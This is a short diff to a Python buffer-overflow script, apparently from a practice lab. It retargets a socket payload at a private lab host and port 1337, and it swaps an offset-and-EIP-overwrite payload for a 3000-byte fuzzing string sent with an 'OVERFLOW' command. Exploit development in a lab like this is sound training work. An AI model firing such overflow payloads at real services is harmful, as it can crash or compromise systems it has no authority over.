@@ -2,18 +2,13 @@
 
 import socket
 
-host, port = "10.10.209.4", 1337
+host, port = "10.10.191.46", 1337
 
-command = b"OVERFLOW1 "
-length = 5000
-offset = 1978
-new_eip = b"BBBB"
+command = b"OVERFLOW4 "
 
 payload = b"".join([
 	command,
-	b"A" * offset,
-	new_eip,
-	b"C" * ( length - len(new_eip) - offset),
+	b"A" * 3000,
 ])
 
 with socket.socket() as s:
